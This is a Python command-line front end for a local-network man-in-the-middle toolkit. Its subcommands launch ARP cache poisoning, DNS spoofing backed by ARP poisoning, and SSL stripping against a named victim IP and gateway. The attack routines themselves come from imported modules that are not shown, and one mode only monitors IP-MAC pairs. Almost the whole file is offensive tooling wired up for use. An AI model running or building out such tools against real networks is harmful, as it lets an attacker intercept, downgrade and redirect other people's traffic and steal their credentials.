import sys, argparse, time, psutil, threading
import arp_poison as arp
import ssl_strip as ssl
import dns_poison as dns
#from scapy.all import sendp, ARP, Ether

def arp_poison():
    if args.arp_attack == 'gratuitous':
        arp.grat_arp_poison(args.iface, args.target_ip, args.spoof_ip, args.backoff)
    elif args.arp_attack == 'callback':
        arp.arp_poison_callback(args.iface, args.target_ip if args.target_ip else 0, args.spoof_ip if args.spoof_ip else 0)
    elif args.arp_attack == 'watcher':
        arp.apr_watcher(args.iface)
    return

def dns_spoof():
    if args.target_ip and args.gateway_ip:
        print(f"[*] Starting background ARP poisoning: {args.target_ip} <-> {args.gateway_ip}")
        if args.callback:
            t = threading.Thread(target=arp.arp_poison_callback, args=(args.iface, args.target_ip, args.gateway_ip), daemon=True)
            t.start()
        else:
            t = threading.Thread(target=arp.grat_arp_poison, args=(args.iface, args.target_ip, args.gateway_ip), daemon=True)
            t.start()
    dns.run_dns_spoof(args.iface, args.target_ip, args.hosts_file)
    return

def ssl_strip():
    # Create config object from global args
    config = ssl.SSLStripConfig(
        iface=args.iface,
        victim_ip=args.target_ip,
        gateway_ip=args.gateway_ip,
        website_ip=args.website_ip,
        listen_port=args.listen_port,
        mode='sniff', # Default mode
        log_file=args.log_file
    )
    ssl.run_ssl_strip(config)
    return

parser = argparse.ArgumentParser()
subparsers = parser.add_subparsers(dest='attack_type')

parser_arp = subparsers.add_parser('arp-poison', aliases=['arp'], help='ARP cache poisoning attacks')
ifaces = [iface for iface in psutil.net_if_addrs().keys()]
parser_arp.add_argument('-i', '--iface', choices=ifaces, required=True, help='Network interface to listen on and send to')
subparsers_arp = parser_arp.add_subparsers(dest='arp_attack')

parser_arp_grat = subparsers_arp.add_parser('gratuitous', aliases=['grat'], help='Send gratuitous spoofed ARP answers repeatedly')
parser_arp_grat.add_argument('-t', '--target_ip', required=True, help='Victim IP address')
parser_arp_grat.add_argument('-s', '--spoof_ip', required=True, help='IP address we will pretend to be')
parser_arp_grat.add_argument('-b', '--backoff', type=int, default=30, help='Add backoff time BACKOFF, if we receive proof that victim is poisoned. Set backoff to 0 for constant packet stream')
parser_arp_grat = subparsers_arp.add_parser('callback', help='Send spoofed ARP answers only after receiving a request.')

parser_arp_grat.add_argument('-t', '--target_ip', help='Victim IP address, if not filled will target all hosts on local network')
parser_arp_grat.add_argument('-s', '--spoof_ip', help='IP address we will pretend to be, if not filled will spoof all hosts on local network')

parser_arp_grat = subparsers_arp.add_parser('watcher', help='Monitor the local network and record IP-MAC pairs in a arp-watcher.db file.')
parser_arp.set_defaults(func=arp_poison)

parser_dns = subparsers.add_parser('dns-spoof', aliases=['dns'], help='DNS spoofing attack')
parser_dns.add_argument('-i', '--iface', required=True, help='Network interface to listen on and send to')
parser_dns.add_argument('-t', '--target_ip', required=True, help='Victim IP address')
parser_dns.add_argument('-f', '--hosts_file', default='dns-file.txt', help='Host mapping file')
parser_dns.add_argument('-g', '--gateway_ip', help='Gateway IP for ARP poisoning')
parser_dns.add_argument('-c', '--callback', action='store_true', help='Only send ARP responses, reduces noise but takes more time')
parser_dns.set_defaults(func=dns_spoof)

parser_ssl = subparsers.add_parser('ssl-strip', aliases=['ssl'], help='SSL strip attack')
parser_ssl.add_argument('-i', '--iface', required=True, help='Network interface to listen on and send to')
parser_ssl.add_argument('-t', '--target_ip', required=True, help='Victim IP address')
parser_ssl.add_argument('-g', '--gateway_ip', required=True, help='Gateway IP address')
parser_ssl.add_argument('-w', '--website_ip', required=True, help='Website IP address')
parser_ssl.add_argument('-p', '--listen_port', type=int, default=8080, help='Port to listen on (if using proxy mode)')
parser_ssl.add_argument('-l', '--log_file', help='Log file path')
parser_ssl.set_defaults(func=ssl_strip)

args = parser.parse_args()

if hasattr(args, 'func'):
    args.func()
